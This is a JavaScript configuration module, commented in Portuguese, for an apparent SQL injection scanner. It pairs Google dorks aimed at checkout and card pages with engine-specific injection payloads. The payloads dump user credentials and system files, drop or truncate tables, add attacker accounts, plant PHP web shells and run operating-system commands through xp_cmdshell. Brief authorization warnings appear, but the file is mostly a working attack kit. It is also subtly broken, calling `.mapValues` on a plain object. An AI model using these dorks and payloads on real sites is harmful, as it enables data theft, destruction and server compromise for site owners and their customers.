import { sanitizeFilename, formatTimestamp } from './utils.js';

/**
 * @typedef {Object} Config
 * @property {number} timeoutMs - Tempo limite para requisições HTTP (ms).
 * @property {number} googleSearchDelay - Atraso entre buscas no Google (ms).
 * @property {number} maxResults - Máximo de resultados por busca.
 * @property {Object<string, string>} headers - Cabeçalhos HTTP padrão.
 * @property {string} outputDir - Diretório para salvar resultados.
 */

/**
 * @typedef {Object} PayloadCategory
 * @property {string[]} mysql - Payloads específicos para MySQL.
 * @property {string[]} postgresql - Payloads específicos para PostgreSQL.
 * @property {string[]} sqlserver - Payloads específicos para SQL Server.
 * @property {string[]} oracle - Payloads específicos para Oracle.
 * @property {string[]} generic - Payloads genéricos aplicáveis a múltiplos SGBDs.
 */

/**
 * @typedef {Object} Payloads
 * @property {PayloadCategory} detection - Payloads para detecção básica de SQL Injection.
 * @property {PayloadCategory} blind - Payloads para injeção cega baseada em tempo ou booleana.
 * @property {PayloadCategory} error - Payloads para injeção baseada em erro.
 * @property {PayloadCategory} column - Payloads para enumeração de colunas.
 * @property {PayloadCategory} dataExtraction - Payloads para extração de dados.
 * @property {PayloadCategory} advanced - Payloads avançados (usar com cuidado, apenas em testes autorizados).
 */

/**
 * Registra logs com nível e timestamp.
 * @param {string} level - Nível do log (INFO, WARN, ERROR).
 * @param {string} message - Mensagem do log.
 */
function log(level, message) {
  console.log(`[${formatTimestamp()}] [${level}] ${message}`);
}

/**
 * Valida um payload ou dork, identificando SGBD e riscos éticos.
 * @param {string} item - Payload ou dork a validar.
 * @param {string} type - Tipo ('payload' ou 'dork').
 * @returns {boolean} True se o item for válido.
 */
function validateItem(item, type) {
  if (typeof item !== 'string' || item.trim().length === 0) {
    log('WARN', `Invalid ${type}: ${item}`);
    return false;
  }
  if (type === 'payload') {
    // Identificar SGBD pelo payload
    const sgbdPatterns = {
      mysql: [/information_schema/i, /@@version/i, /mysql\.user/i],
      postgresql: [/pg_sleep/i, /current_schema/i],
      sqlserver: [/waitfor\s+delay/i, /xp_cmdshell/i],
      oracle: [/dbms_utility/i, /sys\.database_name/i]
    };
    for (const [sgbd, patterns] of Object.entries(sgbdPatterns)) {
      if (patterns.some(pattern => pattern.test(item))) {
        log('INFO', `Payload detected for ${sgbd}: ${item}`);
      }
    }
    // Aviso para payloads perigosos
    const dangerousPatterns = [
      /drop\s+table/i,
      /xp_cmdshell/i,
      /into\s+outfile/i,
      /declare\s+@cmd/i,
      /truncate/i,
      /delete\s+from/i
    ];
    if (dangerousPatterns.some(pattern => pattern.test(item))) {
      log('WARN', `Dangerous payload detected: ${item}. Use only in authorized environments with explicit permission.`);
    }
  }
  return true;
}

/**
 * Configurações globais.
 * @type {Config}
 */
export const CONFIG = {
  timeoutMs: process.env.SQLI_TIMEOUT_MS ? parseInt(process.env.SQLI_TIMEOUT_MS, 10) : 10000,
  googleSearchDelay: process.env.SQLI_GOOGLE_SEARCH_DELAY ? parseInt(process.env.SQLI_GOOGLE_SEARCH_DELAY, 10) : 10000,
  maxResults: process.env.SQLI_MAX_RESULTS ? parseInt(process.env.SQLI_MAX_RESULTS, 10) : 100,
  headers: {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'DNT': '1'
  },
  outputDir: `results_${sanitizeFilename(formatTimestamp())}`
};

/**
 * Padrões de dorks para busca de URLs potencialmente vulneráveis.
 * @type {string[]}
 */
export const DORK_PATTERNS = [
  'inurl:checkout.php?id=',
  'inurl:cartao.php?id=',
  'inurl:cartoes.php?id=',
  'inurl:hospede.php?id=',
  'inurl:detalhes.php?id='
].filter(dork => validateItem(dork, 'dork'));

/**
 * Payloads para testes de SQL Injection.
 * AVISO: Payloads em 'advanced' são potencialmente destrutivos e devem ser usados apenas em ambientes autorizados com permissão explícita.
 * @type {Payloads}
 */
export const PAYLOADS = {
  /**
   * Payloads para detecção básica de vulnerabilidades de SQL Injection.
   */
  detection: {
    mysql: [
      "' OR '1'='1",
      "' OR 1=1--",
      "' OR 1=1#",
      "' OR 1=1/*",
      "') OR '1'='1",
      "')) OR (('1'='1",
      "' UNION SELECT NULL--",
      "admin' --",
      "admin' #",
      "' OR 'x'='x",
      "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
      "' AND 1=0 UNION ALL SELECT NULL,NULL,NULL--",
      "1' ORDER BY 1--+",
      "1' ORDER BY 2--+",
      "1' ORDER BY 3--+",
      "1' GROUP BY 1,2,--+",
      // Novos payloads
      "' OR @@version_compile_os='x'--",
      "' AND 1=CONVERT(int,@@version)--"
    ],
    postgresql: [
      "' OR '1'='1';--",
      "'; SELECT '1' WHERE 1=1--",
      "' OR current_user='postgres'--",
      // Novos payloads
      "' AND 1=(SELECT 1 FROM pg_stat_activity WHERE pid=pg_backend_pid())--",
      "' OR version() LIKE 'PostgreSQL%'--"
    ],
    sqlserver: [
      "' OR '1'='1'--",
      "'; SELECT '1' WHERE @@version IS NOT NULL--",
      // Novos payloads
      "' AND 1=CONVERT(int,@@version)--",
      "' OR @@servername IS NOT NULL--"
    ],
    oracle: [
      "' OR '1'='1'--",
      "' OR USER='SYS'--",
      // Novos payloads
      "' AND 1=(SELECT COUNT(*) FROM v$version)--",
      "' OR PRODUCT_COMPONENT_VERSION IS NOT NULL--"
    ],
    generic: [
      "' OR 1=1",
      "') OR ('1'='1",
      "' OR 'a'='a",
      // Novos payloads
      "1 OR 1=1",
      "' OR EXISTS(SELECT 1)--"
    ]
  },

  /**
   * Payloads para injeção cega baseada em tempo ou booleana.
   */
  blind: {
    mysql: [
      "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--",
      "' AND SLEEP(2)--",
      "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(2)--",
      "1' AND SLEEP(2) AND '1'='1",
      "' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(2),0)--",
      "' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(2),0)--",
      "') AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- ",
      // Novos payloads
      "' AND BENCHMARK(5000000,SHA1(1))--",
      "' AND IF(ASCII(SUBSTRING(@@version,1,1))>0,SLEEP(2),0)--"
    ],
    postgresql: [
      "'; SELECT PG_SLEEP(2)--",
      "' AND (SELECT 1 FROM PG_SLEEP(2))--",
      // Novos payloads
      "' AND CASE WHEN (SELECT COUNT(*) FROM pg_tables)>0 THEN PG_SLEEP(2) ELSE 0 END--",
      "' AND (SELECT 1 WHERE EXISTS(SELECT 1 FROM pg_user) AND PG_SLEEP(2))--"
    ],
    sqlserver: [
      "' WAITFOR DELAY '0:0:2'--",
      "'; IF (SELECT COUNT(*) FROM sys.tables)>0 WAITFOR DELAY '0:0:2'--",
      // Novos payloads
      "' AND CASE WHEN (SELECT LEN(@@version))>0 THEN WAITFOR DELAY '0:0:2' ELSE 0 END--",
      "' AND EXISTS(SELECT 1 FROM sysobjects WHERE xtype='U') WAITFOR DELAY '0:0:2'--"
    ],
    oracle: [
      "' AND (SELECT DBMS_LOCK.SLEEP(2) FROM DUAL)--",
      // Novos payloads
      "' AND CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN DBMS_LOCK.SLEEP(2) ELSE 0 END--",
      "' AND EXISTS(SELECT 1 FROM v$session) AND DBMS_LOCK.SLEEP(2)--"
    ],
    generic: [
      // Novos payloads
      "' AND 1=(SELECT CASE WHEN 1=1 THEN SLEEP(2) ELSE 0 END)--",
      "' AND IF(1=1,SLEEP(2),0)--"
    ]
  },

  /**
   * Payloads para injeção baseada em erro.
   */
  error: {
    mysql: [
      "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
      "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT database()))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
      "' AND extractvalue(1,concat(0x3a,(SELECT database())))--",
      "' AND updatexml(1,concat(0x3a,(SELECT database())),1)--",
      "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DISTINCT CONCAT(0x3a,schema_name) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
      // Novos payloads
      "' AND (SELECT 1/0 FROM information_schema.tables)--",
      "' AND CAST((SELECT database()) AS INT)--"
    ],
    postgresql: [
      // Novos payloads
      "' AND (SELECT 1/(SELECT CASE WHEN (SELECT current_user)='postgres' THEN 0 ELSE 1 END))--",
      "' AND (SELECT CAST(current_schema AS INT))--"
    ],
    sqlserver: [
      // Novos payloads
      "' AND (SELECT 1/0 FROM sys.tables)--",
      "' AND CONVERT(INT,(SELECT DB_NAME()))--"
    ],
    oracle: [
      // Novos payloads
      "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(DBMS_UTILITY.DB_VERSION,FLOOR(RAND(0)*2))x FROM all_tables GROUP BY x)a)--",
      "' AND (SELECT TO_NUMBER(SYS.DATABASE_NAME) FROM DUAL)--"
    ],
    generic: [
      // Novos payloads
      "' AND 1/0--",
      "' AND CAST('a' AS INT)--"
    ]
  },

  /**
   * Payloads para enumeração de colunas usando UNION.
   */
  column: {
    mysql: [
      "' UNION ALL SELECT NULL--",
      "' UNION ALL SELECT NULL,NULL--",
      "' UNION ALL SELECT NULL,NULL,NULL--",
      "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
      "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
      "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
      "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
      "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
      // Novos payloads
      "' UNION ALL SELECT 1,2,3--",
      "' UNION ALL SELECT NULL,@@version,NULL--"
    ],
    postgresql: [
      // Novos payloads
      "' UNION ALL SELECT NULL::text--",
      "' UNION ALL SELECT NULL::text,NULL::text--"
    ],
    sqlserver: [
      // Novos payloads
      "' UNION ALL SELECT NULL,NULL--",
      "' UNION ALL SELECT 1,@@version--"
    ],
    oracle: [
      // Novos payloads
      "' UNION ALL SELECT NULL FROM DUAL--",
      "' UNION ALL SELECT NULL,NULL FROM DUAL--"
    ],
    generic: [
      // Novos payloads
      "' UNION ALL SELECT 1--",
      "' UNION ALL SELECT 'test'--"
    ]
  },

  /**
   * Payloads para extração de dados de bancos, tabelas, colunas e registros.
   */
  dataExtraction: {
    mysql: [
      "' UNION SELECT CONCAT(schema_name,'::'),NULL FROM information_schema.schemata--",
      "' UNION SELECT CONCAT(table_name,'::'),NULL FROM information_schema.tables WHERE table_schema=database()--",
      "' UNION SELECT CONCAT(column_name,'::'),NULL FROM information_schema.columns WHERE table_schema=database()--",
      "' UNION SELECT CONCAT(username,'::',password),NULL FROM users--",
      "' UNION SELECT CONCAT(user,'::',password),NULL FROM user--",
      "' UNION SELECT CONCAT(name,'::',pass),NULL FROM admin--",
      "' UNION SELECT GROUP_CONCAT(table_name SEPARATOR '::'),NULL FROM information_schema.tables WHERE table_schema=database()--",
      "' UNION SELECT CONCAT(@@version,'::',@@datadir),NULL--",
      "' UNION SELECT CONCAT(user(),'::',database()),NULL--",
      "' UNION SELECT CONCAT(super_priv,'::',file_priv),NULL FROM mysql.user WHERE user=current_user--",
      "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--",
      "' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL--",
      "' AND (SELECT GROUP_CONCAT(table_name SEPARATOR '::') FROM information_schema.tables WHERE table_schema=database())--",
      "' AND (SELECT GROUP_CONCAT(column_name SEPARATOR '::') FROM information_schema.columns WHERE table_schema=database())--",
      "' AND (SELECT GROUP_CONCAT(CONCAT(username,'::',password) SEPARATOR '::') FROM users)--",
      // Novos payloads
      "' UNION SELECT CONCAT(GROUP_CONCAT(DISTINCT user),'::'),NULL FROM mysql.user--",
      "' UNION SELECT HEX(LOAD_FILE('/etc/mysql/my.cnf')),NULL--"
    ],
    postgresql: [
      // Novos payloads
      "' UNION SELECT CONCAT(table_name,'::'),NULL FROM information_schema.tables WHERE table_schema='public'--",
      "' UNION SELECT CONCAT(column_name,'::'),NULL FROM information_schema.columns WHERE table_schema='public'--",
      "' UNION SELECT CONCAT(current_user,'::',current_database()),NULL--",
      "' UNION SELECT CONCAT(rolname,'::',rolpassword),NULL FROM pg_roles--"
    ],
    sqlserver: [
      // Novos payloads
      "' UNION SELECT CONCAT(name,'::'),NULL FROM sys.databases--",
      "' UNION SELECT CONCAT(name,'::'),NULL FROM sys.tables--",
      "' UNION SELECT CONCAT(column_name,'::'),NULL FROM information_schema.columns WHERE table_schema=DATABASE()--",
      "' UNION SELECT CONCAT(DB_NAME(),'::',@@version),NULL--"
    ],
    oracle: [
      // Novos payloads
      "' UNION SELECT CONCAT(table_name,'::'),NULL FROM all_tables--",
      "' UNION SELECT CONCAT(column_name,'::'),NULL FROM all_tab_columns--",
      "' UNION SELECT CONCAT(username,'::',password),NULL FROM all_users--",
      "' UNION SELECT SYS.DATABASE_NAME,NULL FROM DUAL--"
    ],
    generic: [
      // Novos payloads
      "' UNION SELECT CONCAT('version','::',version()),NULL--",
      "' UNION SELECT CONCAT('user','::',current_user),NULL--"
    ]
  },

  /**
   * Payloads avançados para exploração (extremamente perigosos, usar apenas em testes autorizados).
   */
  advanced: {
    mysql: [
      "'; DROP TABLE users--",
      "'; UPDATE users SET password='hacked' WHERE username='admin'--",
      "'; INSERT INTO users (username,password) VALUES ('hacker','pwned')--",
      "'; SELECT '<?php system($_GET[\"cmd\"]);?>' INTO OUTFILE '/var/www/shell.php'--",
      "'; SELECT '<?php eval($_POST[\"code\"]);?>' INTO OUTFILE '/var/www/backdoor.php'--",
      // Novos payloads
      "'; TRUNCATE TABLE users--",
      "'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255)--"
    ],
    postgresql: [
      // Novos payloads
      "'; DROP TABLE users CASCADE--",
      "'; INSERT INTO users (username, password) VALUES ('hacker', 'pwned')--",
      "'; CREATE TABLE backdoor (id SERIAL, data TEXT)--"
    ],
    sqlserver: [
      "'; DECLARE @cmd VARCHAR(255); SET @cmd = 'ping 10.10.10.10'; EXEC master..xp_cmdshell @cmd;--",
      "'; exec master..xp_cmdshell 'net user';--",
      "'; EXEC xp_cmdshell 'echo vulnerable > C:\\vuln.txt'--",
      // Novos payloads
      "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--",
      "'; EXEC master..xp_cmdshell 'whoami';--"
    ],
    oracle: [
      // Novos payloads
      "'; DROP TABLE users--",
      "'; EXECUTE IMMEDIATE 'CREATE USER hacker IDENTIFIED BY pwned'--",
      "'; EXEC DBMS_UTILITY.EXEC_DDL_STATEMENT('CREATE TABLE backdoor (id NUMBER, data VARCHAR2(255))')--"
    ],
    generic: [
      // Novos payloads
      "'; SELECT 'malicious' INTO DUMPFILE '/tmp/malicious.txt'--",
      "'; EXECUTE 'whoami'--"
    ]
  }
}.mapValues(category => ({
  mysql: category.mysql.filter(payload => validateItem(payload, 'payload')),
  postgresql: category.postgresql.filter(payload => validateItem(payload, 'payload')),
  sqlserver: category.sqlserver.filter(payload => validateItem(payload, 'payload')),
  oracle: category.oracle.filter(payload => validateItem(payload, 'payload')),
  generic: category.generic.filter(payload => validateItem(payload, 'payload'))
}));
